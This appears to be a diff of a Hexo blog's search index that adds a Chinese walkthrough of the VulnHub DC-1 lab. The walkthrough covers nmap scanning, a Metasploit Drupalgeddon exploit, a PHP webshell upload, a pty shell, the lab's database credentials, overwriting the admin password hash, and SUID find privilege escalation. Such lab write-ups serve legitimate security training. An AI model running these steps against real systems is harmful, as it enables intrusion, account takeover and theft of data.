@@ -1,33 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Hello World</title>
-    <url>/2022/04/12/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>渗透-DC1</title>
-    <url>/2022/04/15/%E6%B8%97%E9%80%8F-DC1/</url>
-    <content><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./imgs/DC1/1.png" alt="avatar"></p>
-<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2>]]></content>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
+<search> 
+  
+  
+    
+    <entry>
+      <title>渗透-DC1</title>
+      <link href="/2022/04/15/DC-1/"/>
+      <url>/2022/04/15/DC-1/</url>
+      
+        <content type="html"><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/1.png" alt="img"></p><p>192.168.178.129：目标主机</p><h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p- 192.168.178.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/2.png" alt="img"></p><p>发现开启了端口80<br>浏览192.168.178.129:80</p><p><img src="/2022/04/15/DC-1/3.png" alt="img"></p><p>查看Wappalyzer</p><p><img src="/2022/04/15/DC-1/4.png" alt="img"></p><p>发现cms为Drupal，这版本有点low，估计有漏洞</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>使用msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/5.png" alt="img"></p><p>这里我们选择exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br><span class="line">options//查看需要设置的参数</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.178.129//设置目标ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功后我们执行ls，查看当前目录</p><p><img src="/2022/04/15/DC-1/6.png" alt="img"></p><p>发现flag1.txt，打开查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag1.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/7.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>到这里，上传个一句话木马看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /data/shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑进行连接</p><p><img src="/2022/04/15/DC-1/8.png" alt="img"></p><p>找找第二个flag在哪<br>最后发现在settings.php中</p><p><img src="/2022/04/15/DC-1/9.png" alt="img"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>里面还有数据库的账号密码，也发现是mysql<br>在msf上传个交互shell, 然后连接mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u dbuser -p </span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure><p>然后就常规的，查库，查表，查列，爆内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases; </span><br><span class="line">use drupaldb; </span><br><span class="line">show tables; </span><br><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/10.png" alt="img"></p><p>这里admin的密码被加密了，我们选择update的方式改为我们知道的密码<br>其中drupal可以通过password-hash.sh生成新的密码<br>我们在www目录执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/11.png" alt="img"></p><p>sql中的替换语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DtPgSa61SbR1DXIh4wWcMft/rOmsKXcgvxTUAgenIMRbH65ZUAZu&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用账号：admin 密码：admin ，登录192.168.178.129:80查看里面信息</p><p><img src="/2022/04/15/DC-1/12.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在home目录下发现flag4.txt</p><p><img src="/2022/04/15/DC-1/13.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>所以我们要提权到root，这里我们用find提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/14.png" alt="img"></p><p>发现find能利用<br>在&#x2F;tmp目录下创建command文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">command</span></span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/15.png" alt="img"></p><p>发现获得root权限了<br>修改命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> /root \; </span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> /root/thefinalflag.txt \; </span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/16.png" alt="img"></p><p>到处为止DC-1完成</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 实践 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
